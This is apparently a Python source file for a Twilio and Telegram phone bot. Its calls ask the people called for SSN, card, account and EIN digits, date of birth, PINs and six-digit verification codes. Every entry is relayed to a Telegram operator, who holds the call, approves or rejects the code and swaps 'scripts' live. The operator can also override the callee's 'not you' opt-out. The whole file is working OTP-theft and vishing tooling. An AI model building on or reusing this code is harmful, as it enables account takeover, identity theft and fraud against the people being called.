"""
Verification routes: opt-out, phone, SSN, OTP hold, and generic retry builders.
"""

from flask import Blueprint, Response, request
from twilio.twiml.voice_response import VoiceResponse
from telebot import types

import dbase as db
from modules import call_state as cs
from modules.bot_core import bot, send, safe_answer, back_button  # noqa: F401
from modules.notify import notify_caller, format_digits
from modules.twiml_engine import all_available_scripts

verify_bp = Blueprint("verify", __name__)

HOLD_POLL_SECONDS = 3
HOLD_MAX_SECONDS = 600

# After this many silent retries on any step, end the call politely.
MAX_STEP_RETRIES = 3


def _xml(body):
    return Response(str(body), mimetype="application/xml")


# ============================================================
# Retry counters
# ============================================================

def _bump_retry(sid, step_name):
    """Increment and return the retry count for this (call, step)."""
    st = cs.get(sid) or {}
    counters = dict(st.get("retry_counts") or {})
    counters[step_name] = counters.get(step_name, 0) + 1
    try:
        cs._state.setdefault(sid, {})["retry_counts"] = counters
    except Exception:
        pass
    return counters[step_name]


def _reset_retry(sid, step_name):
    """Reset the retry count when the caller finally enters something."""
    st = cs.get(sid) or {}
    counters = dict(st.get("retry_counts") or {})
    counters.pop(step_name, None)
    try:
        cs._state.setdefault(sid, {})["retry_counts"] = counters
    except Exception:
        pass


def _give_up_twiml(message="We did not receive your input. Goodbye."):
    resp = VoiceResponse()
    resp.say(message)
    return resp


# ============================================================
# Helpers
# ============================================================

def _hold_twiml(say_text=None, then_endpoint="/webhooks/voice/verify/hold"):
    resp = VoiceResponse()
    if say_text:
        resp.say(say_text)
    resp.pause(length=HOLD_POLL_SECONDS)
    resp.redirect(then_endpoint, method="POST")
    return str(resp)


def _retry_twiml(step_name, prompt_text, digits, action, sid=None):
    """
    Build a retry TwiML. If the retry cap has been reached, hang up instead.
    """
    if sid and _bump_retry(sid, step_name) > MAX_STEP_RETRIES:
        cs.clear(sid)
        return _give_up_twiml(
            "We did not receive your input. Please try again later. Goodbye."
        )

    resp = VoiceResponse()
    with resp.gather(num_digits=digits,
                     finish_on_key="#",
                     action=action,
                     timeout=12) as g:
        g.say(prompt_text)
    resp.redirect(f"/webhooks/voice/verify/{step_name}_retry", method="POST")
    return resp


def _accept(label, next_action=None, reset_step=None):
    call_sid = request.values.get("CallSid") or ""
    entered = request.values.get("Digits") or request.values.get("SpeechResult") or ""
    step = request.values.get("step", "")
    script = request.values.get("script", "")
    company = request.values.get("company", "")

    if reset_step and call_sid:
        _reset_retry(call_sid, reset_step)

    header = f"📥 *{label}*"
    if step:
        header += f" (step {step})"
    if script:
        header += f" - {script}"

    notify_caller(
        call_sid,
        f"{header}\n"
        f"Entered: {format_digits(entered)}",
        parse_mode="Markdown",
    )

    if next_action:
        resp = VoiceResponse()
        resp.redirect(next_action, method="POST")
        return _xml(resp)

    resp = VoiceResponse()
    resp.say("Thank you. Goodbye.")
    return _xml(resp)


_VERIFY_RETRY_SPECS = {
    "passcode_retry": (
        "Please enter your six digit account passcode now, followed by the pound key.",
        6, "/webhooks/voice/verify/passcode", None),
    "last4_account_retry": (
        "Please enter the last four digits of your account number now.",
        4, "/webhooks/voice/verify/last4_account", None),
    "last4_card_retry": (
        "Please enter the last four digits of the card now.",
        4, "/webhooks/voice/verify/last4_card", None),
    "last4_pan_retry": (
        "Please enter the last four digits of the card on your account now.",
        4, "/webhooks/voice/verify/last4_pan", None),
    "last4_ein_retry": (
        "Please enter the last four digits of your EIN now.",
        4, "/webhooks/voice/verify/last4_ein", None),
    "zip_retry": (
        "Please enter your five digit zip code now, followed by the pound key.",
        5, "/webhooks/voice/verify/zip", None),
    "dob_retry": (
        "Please enter your date of birth, month month day day year year year year, "
        "followed by the pound key.",
        8, "/webhooks/voice/verify/dob", None),
    "patient_pin_retry": (
        "Please enter your four digit patient PIN now.",
        4, "/webhooks/voice/verify/patient_pin", None),
    "order_number_retry": (
        "Please enter or say your order number now.",
        12, "/webhooks/voice/verify/order_number", "dtmf speech"),
    "name_zip_retry": (
        "Please say your last name, then enter your five digit zip code.",
        5, "/webhooks/voice/verify/name_zip", "speech dtmf"),
    "kba_name_retry": (
        "Please say your last name now.",
        1, "/webhooks/voice/verify/kba_name", "speech"),
}


def _generic_verify_retry(spec_key):
    sid = request.values.get("CallSid", "")
    if sid and _bump_retry(sid, spec_key) > MAX_STEP_RETRIES:
        cs.clear(sid)
        return _xml(_give_up_twiml(
            "We did not receive your input. Please try again later. Goodbye."
        ))

    prompt, digits, action, input_mode = _VERIFY_RETRY_SPECS[spec_key]
    resp = VoiceResponse()
    if input_mode:
        with resp.gather(finish_on_key="#",
                         action=action,
                         timeout=12,
                         input=input_mode,
                         speech_timeout="auto") as g:
            g.say(prompt)
    else:
        with resp.gather(num_digits=digits,
                         finish_on_key="#",
                         action=action,
                         timeout=12) as g:
            g.say(prompt)
    resp.redirect(f"/webhooks/voice/verify/{spec_key}", method="POST")
    return _xml(resp)


# ============================================================
# Opt-out (not_you)
# ============================================================

@verify_bp.route("/webhooks/voice/verify/not_you", methods=["POST"])
def v_not_you():
    digits = request.values.get("Digits", "")
    call_sid = request.values.get("CallSid", "")
    cs.ensure(call_sid, phase="not_you")

    if digits == "1":
        try:
            chat_id, _uid = db.get_call_owner(call_sid)
        except Exception:
            chat_id = None

        if chat_id:
            try:
                client_name, client_email = db.get_call_client(call_sid)
            except Exception:
                client_name, client_email = (None, None)
            try:
                company = db.get_call_company(call_sid)
            except Exception:
                company = None

            kb = types.InlineKeyboardMarkup(row_width=2)
            kb.row(
                types.InlineKeyboardButton(
                    "✅ Approve removal",
                    callback_data=f"ny_app:{call_sid}",
                ),
                types.InlineKeyboardButton(
                    "❌ Reject removal",
                    callback_data=f"ny_rej:{call_sid}",
                ),
            )

            client_line = ""
            if client_name or client_email:
                client_line = (
                    f"\nClient: *{client_name or '-'}*"
                    f"\nEmail: `{client_email or '-'}`"
                )
            company_txt = f"\nCompany: *{company}*" if company else ""

            send(
                chat_id,
                f"🚨 *Not-you opt-out*\n"
                f"Caller pressed 1 (not them)"
                f"{client_line}"
                f"{company_txt}\n\n"
                f"*Approve removal* → caller is told they've been removed and the call ends.\n"
                f"*Reject removal* → caller is asked to stay on the line and verification continues.",
                parse_mode="Markdown",
                reply_markup=kb,
            )

        cs.set_phase(call_sid, "notyou_hold")
        resp = VoiceResponse()
        resp.say("Please hold while we process your request.")
        resp.pause(length=HOLD_POLL_SECONDS)
        resp.redirect("/webhooks/voice/verify/not_you_hold", method="POST")
        return _xml(resp)

    notify_caller(
        call_sid,
        "🤔 *No opt-out response*\nProceeding with verification.",
        parse_mode="Markdown",
    )
    cs.set_phase(call_sid, "phone")
    resp = VoiceResponse()
    resp.redirect("/webhooks/voice/verify/last4_phone_retry", method="POST")
    return _xml(resp)


@verify_bp.route("/webhooks/voice/verify/not_you_hold", methods=["POST"])
def v_not_you_hold():
    sid = request.values.get("CallSid", "")
    st = cs.get(sid) or {}
    if not st:
        cs.ensure(sid, phase="notyou_hold")
        st = cs.get(sid)

    decision = st.get("notyou_decision")
    if decision == "approve":
        cs.clear(sid)
        resp = VoiceResponse()
        resp.say("You have been removed from our list. Goodbye.")
        return _xml(resp)

    if decision == "reject":
        cs.set_notyou_decision(sid, None)
        cs.set_phase(sid, "phone")
        resp = VoiceResponse()
        resp.say("Thank you. Please stay on the line while we verify your identity.")
        resp.redirect("/webhooks/voice/verify/last4_phone_retry", method="POST")
        return _xml(resp)

    attempts = st.get("attempts", 0)
    if attempts * HOLD_POLL_SECONDS > HOLD_MAX_SECONDS:
        cs.clear(sid)
        resp = VoiceResponse()
        resp.say("We could not process your request. Goodbye.")
        return _xml(resp)

    return _xml(_hold_twiml(
        say_text=None,
        then_endpoint="/webhooks/voice/verify/not_you_hold",
    ))


@verify_bp.route("/webhooks/voice/verify/not_you_silent", methods=["POST"])
def v_not_you_silent():
    call_sid = request.values.get("CallSid", "")
    cs.ensure(call_sid, phase="not_you_silent")
    notify_caller(
        call_sid,
        "🤔 *No opt-out response*\nProceeding with verification.",
        parse_mode="Markdown",
    )
    resp = VoiceResponse()
    resp.say("Thank you. We will now verify your identity.")
    resp.redirect("/webhooks/voice/verify/last4_phone_retry", method="POST")
    return _xml(resp)


@verify_bp.route("/webhooks/voice/verify/not_you_retry", methods=["POST"])
def v_not_you_retry():
    call_sid = request.values.get("CallSid", "")
    cs.ensure(call_sid, phase="not_you")

    if call_sid and _bump_retry(call_sid, "not_you_retry") > MAX_STEP_RETRIES:
        cs.clear(call_sid)
        return _xml(_give_up_twiml(
            "We did not receive your input. Please try again later. Goodbye."
        ))

    resp = VoiceResponse()
    with resp.gather(num_digits=1,
                     action="/webhooks/voice/verify/not_you",
                     timeout=6) as g:
        g.say("If this was not you, press 1 now. Otherwise, please stay on the line.")
    resp.redirect("/webhooks/voice/verify/not_you_silent", method="POST")
    return _xml(resp)


# ============================================================
# Phone / SSN
# ============================================================

@verify_bp.route("/webhooks/voice/verify/last4_phone", methods=["POST"])
def v_last4_phone():
    call_sid = request.values.get("CallSid", "")
    cs.set_phase(call_sid, "phone_done")
    return _accept("Last-4 phone",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="last4_phone_retry")


@verify_bp.route("/webhooks/voice/verify/last4_phone_retry", methods=["POST"])
def v_last4_phone_retry():
    call_sid = request.values.get("CallSid", "")
    cs.ensure(call_sid, phase="phone")
    return _xml(_retry_twiml(
        step_name="last4_phone_retry",
        prompt_text=("Please enter the four digits of the phone number "
                     "on your account. Enter the four digits now."),
        digits=4,
        action="/webhooks/voice/verify/last4_phone",
        sid=call_sid,
    ))


@verify_bp.route("/webhooks/voice/verify/last4_ssn", methods=["POST"])
def v_last4_ssn():
    call_sid = request.values.get("CallSid", "")
    cs.set_phase(call_sid, "ssn_done")
    return _accept("Last-4 SSN",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="last4_ssn_retry")


@verify_bp.route("/webhooks/voice/verify/last4_ssn_retry", methods=["POST"])
def v_last4_ssn_retry():
    call_sid = request.values.get("CallSid", "")
    cs.ensure(call_sid, phase="ssn")
    return _xml(_retry_twiml(
        step_name="last4_ssn_retry",
        prompt_text=("Please enter the four digits of your Social "
                     "Security Number. Enter the four digits now."),
        digits=4,
        action="/webhooks/voice/verify/last4_ssn",
        sid=call_sid,
    ))


# ============================================================
# Primary collectors
# ============================================================

@verify_bp.route("/webhooks/voice/verify/passcode", methods=["POST"])
def v_passcode():
    return _accept("Passcode", next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="passcode_retry")


@verify_bp.route("/webhooks/voice/verify/last4_account", methods=["POST"])
def v_last4_account():
    return _accept("Last-4 account",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="last4_account_retry")


@verify_bp.route("/webhooks/voice/verify/last4_card", methods=["POST"])
def v_last4_card():
    return _accept("Last-4 card",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="last4_card_retry")


@verify_bp.route("/webhooks/voice/verify/last4_pan", methods=["POST"])
def v_last4_pan():
    return _accept("Last-4 card (PAN)",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="last4_pan_retry")


@verify_bp.route("/webhooks/voice/verify/last4_ein", methods=["POST"])
def v_last4_ein():
    return _accept("Last-4 EIN",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="last4_ein_retry")


@verify_bp.route("/webhooks/voice/verify/zip", methods=["POST"])
def v_zip():
    return _accept("Zip code",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="zip_retry")


@verify_bp.route("/webhooks/voice/verify/dob", methods=["POST"])
def v_dob():
    return _accept("Date of birth",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="dob_retry")


@verify_bp.route("/webhooks/voice/verify/patient_pin", methods=["POST"])
def v_patient_pin():
    return _accept("Patient PIN",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="patient_pin_retry")


@verify_bp.route("/webhooks/voice/verify/order_number", methods=["POST"])
def v_order_number():
    return _accept("Order number",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="order_number_retry")


@verify_bp.route("/webhooks/voice/verify/name_zip", methods=["POST"])
def v_name_zip():
    return _accept("Name + Zip",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="name_zip_retry")


@verify_bp.route("/webhooks/voice/verify/kba_name", methods=["POST"])
def v_kba_name():
    speech = request.values.get("SpeechResult", "") or ""
    call_sid = request.values.get("CallSid", "")
    notify_caller(
        call_sid,
        f"📥 *KBA name*\nHeard: `{speech}`" if speech
        else "📥 *KBA name*\n_no speech_",
        parse_mode="Markdown",
    )
    return _accept("KBA name",
                   next_action="/webhooks/voice/verify/otp_retry",
                   reset_step="kba_name_retry")


# ============================================================
# Retry routes
# ============================================================

@verify_bp.route("/webhooks/voice/verify/passcode_retry", methods=["POST"])
def v_passcode_retry():     return _generic_verify_retry("passcode_retry")

@verify_bp.route("/webhooks/voice/verify/last4_account_retry", methods=["POST"])
def v_last4_account_retry(): return _generic_verify_retry("last4_account_retry")

@verify_bp.route("/webhooks/voice/verify/last4_card_retry", methods=["POST"])
def v_last4_card_retry():   return _generic_verify_retry("last4_card_retry")

@verify_bp.route("/webhooks/voice/verify/last4_pan_retry", methods=["POST"])
def v_last4_pan_retry():    return _generic_verify_retry("last4_pan_retry")

@verify_bp.route("/webhooks/voice/verify/last4_ein_retry", methods=["POST"])
def v_last4_ein_retry():    return _generic_verify_retry("last4_ein_retry")

@verify_bp.route("/webhooks/voice/verify/zip_retry", methods=["POST"])
def v_zip_retry():          return _generic_verify_retry("zip_retry")

@verify_bp.route("/webhooks/voice/verify/dob_retry", methods=["POST"])
def v_dob_retry():          return _generic_verify_retry("dob_retry")

@verify_bp.route("/webhooks/voice/verify/patient_pin_retry", methods=["POST"])
def v_patient_pin_retry():  return _generic_verify_retry("patient_pin_retry")

@verify_bp.route("/webhooks/voice/verify/order_number_retry", methods=["POST"])
def v_order_number_retry(): return _generic_verify_retry("order_number_retry")

@verify_bp.route("/webhooks/voice/verify/name_zip_retry", methods=["POST"])
def v_name_zip_retry():     return _generic_verify_retry("name_zip_retry")

@verify_bp.route("/webhooks/voice/verify/kba_name_retry", methods=["POST"])
def v_kba_name_retry():     return _generic_verify_retry("kba_name_retry")


# ============================================================
# OTP live hold
# ============================================================

@verify_bp.route("/webhooks/voice/verify/otp", methods=["POST"])
def v_otp():
    call_sid = request.values.get("CallSid", "")
    entered = request.values.get("Digits", "") or ""
    step = request.values.get("step", "")
    script = request.values.get("script", "")
    company = request.values.get("company", "")

    if call_sid:
        _reset_retry(call_sid, "otp_retry")

    st = cs.get(call_sid)
    if not st:
        try:
            chat_id, _uid = db.get_call_owner(call_sid)
        except Exception:
            chat_id = None
        cs.new_call(call_sid, chat_id=chat_id, script=script,
                    company=company, phase="otp")
    cs.set_code(call_sid, entered)
    cs.set_phase(call_sid, "hold")
    st = cs.get(call_sid)

    try:
        chat_id, _uid = db.get_call_owner(call_sid)
    except Exception:
        chat_id = None

    try:
        client_name, client_email = db.get_call_client(call_sid)
    except Exception:
        client_name, client_email = (None, None)

    if chat_id:
        step_txt = f"Step {step}" if step else "OTP"
        script_txt = f" on *{script}*" if script else ""
        company_txt = f"\nCompany: *{company}*" if company else ""
        attempt = st.get("attempts", 1)

        client_line = ""
        if client_name or client_email:
            client_line = (
                f"\nClient: *{client_name or '-'}*"
                f"\nEmail: `{client_email or '-'}`"
            )

        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.row(
            types.InlineKeyboardButton("✅ Approve",
                                       callback_data=f"app:verify:{call_sid}"),
            types.InlineKeyboardButton("❌ Reject",
                                       callback_data=f"rej:verify:{call_sid}"),
        )
        scripts = [s for s in all_available_scripts() if s != script][:4]
        for s in scripts:
            kb.add(types.InlineKeyboardButton(
                f"📄 Switch to {s}",
                callback_data=f"swap:{s}:{call_sid}",
            ))

        send(
            chat_id,
            f"🔐 *Verification code entered* ({step_txt}){script_txt}\n"
            f"Customer entered: {format_digits(entered)}\n"
            f"Attempt #{attempt}"
            f"{client_line}"
            f"{company_txt}\n\n"
            f"The call is *on hold*. Approve to end the call with a "
            f"success message, or Reject to ask the caller to try again.\n"
            f"You can also switch to another template while they wait.",
            parse_mode="Markdown",
            reply_markup=kb,
        )

    resp = VoiceResponse()
    resp.say("Please hold while we verify your code.")
    resp.pause(length=HOLD_POLL_SECONDS)
    resp.redirect("/webhooks/voice/verify/hold", method="POST")
    return _xml(resp)


@verify_bp.route("/webhooks/voice/verify/hold", methods=["POST"])
def v_hold():
    sid = request.values.get("CallSid", "")
    script = request.values.get("script", "")
    company = request.values.get("company", "")
    st = cs.get(sid) or {}

    if not st:
        cs.ensure(sid, script=script, company=company, phase="hold")
        st = cs.get(sid)

    decision = st.get("decision")

    if decision == "approve":
        cs.clear(sid)
        resp = VoiceResponse()
        resp.say("Thank you. Your identity has been verified. Goodbye.")
        return _xml(resp)

    if decision == "reject":
        cs.set_decision(sid, None)
        cs.set_phase(sid, "otp")
        resp = VoiceResponse()
        resp.say("The code you entered was not valid. Please try again.")
        resp.redirect("/webhooks/voice/verify/otp_retry", method="POST")
        return _xml(resp)

    attempts = st.get("attempts", 0)
    if attempts * HOLD_POLL_SECONDS > HOLD_MAX_SECONDS:
        cs.clear(sid)
        resp = VoiceResponse()
        resp.say("We could not verify your identity at this time. Goodbye.")
        return _xml(resp)

    return _xml(_hold_twiml(
        say_text=None,
        then_endpoint="/webhooks/voice/verify/hold",
    ))


@verify_bp.route("/webhooks/voice/verify/otp_retry", methods=["POST"])
def v_otp_retry():
    call_sid = request.values.get("CallSid", "")
    cs.ensure(call_sid, phase="otp")

    if call_sid and _bump_retry(call_sid, "otp_retry") > MAX_STEP_RETRIES:
        cs.clear(call_sid)
        return _xml(_give_up_twiml(
            "We did not receive your code. Please try again later. Goodbye."
        ))

    resp = VoiceResponse()
    with resp.gather(num_digits=6,
                     finish_on_key="#",
                     action="/webhooks/voice/verify/otp",
                     timeout=15) as g:
        g.say("Please enter the six digit verification code.")
    resp.redirect("/webhooks/voice/verify/otp_retry", method="POST")
    return _xml(resp)


# ============================================================
# Telegram callbacks for OTP hold
# ============================================================

@bot.callback_query_handler(func=lambda c: c.data.startswith("app:verify:"))
def cb_approve_verify(call):
    sid = call.data.split(":", 2)[2]
    st = cs.get(sid)
    if not st:
        safe_answer(call, "This call is no longer active.", alert=True)
        return
    cs.set_decision(sid, "approve")
    safe_answer(call, "Approved ✅")
    try:
        bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    except Exception:
        pass
    send(call.message.chat.id,
         f"✅ Approved - call `{sid}` will end with a success message.",
         parse_mode="Markdown")


@bot.callback_query_handler(func=lambda c: c.data.startswith("rej:verify:"))
def cb_reject_verify(call):
    sid = call.data.split(":", 2)[2]
    st = cs.get(sid)
    if not st:
        safe_answer(call, "This call is no longer active.", alert=True)
        return
    cs.set_decision(sid, "reject")
    safe_answer(call, "Rejected ❌")
    try:
        bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    except Exception:
        pass
    send(call.message.chat.id,
         f"❌ Rejected - the caller will be asked to enter the code again.",
         parse_mode="Markdown")


# ============================================================
# Telegram callbacks for opt-out hold
# ============================================================

@bot.callback_query_handler(func=lambda c: c.data.startswith("ny_app:"))
def cb_notyou_approve(call):
    sid = call.data.split(":", 1)[1]
    st = cs.get(sid)
    if not st:
        safe_answer(call, "This call is no longer active.", alert=True)
        return
    cs.set_notyou_decision(sid, "approve")
    safe_answer(call, "Approved removal ✅")
    try:
        bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    except Exception:
        pass
    send(call.message.chat.id,
         f"✅ Removal approved - caller will be removed and the call ends.",
         parse_mode="Markdown")


@bot.callback_query_handler(func=lambda c: c.data.startswith("ny_rej:"))
def cb_notyou_reject(call):
    sid = call.data.split(":", 1)[1]
    st = cs.get(sid)
    if not st:
        safe_answer(call, "This call is no longer active.", alert=True)
        return
    cs.set_notyou_decision(sid, "reject")
    safe_answer(call, "Removal rejected ❌")
    try:
        bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    except Exception:
        pass
    send(call.message.chat.id,
         f"❌ Removal rejected - verification will continue for this caller.",
         parse_mode="Markdown")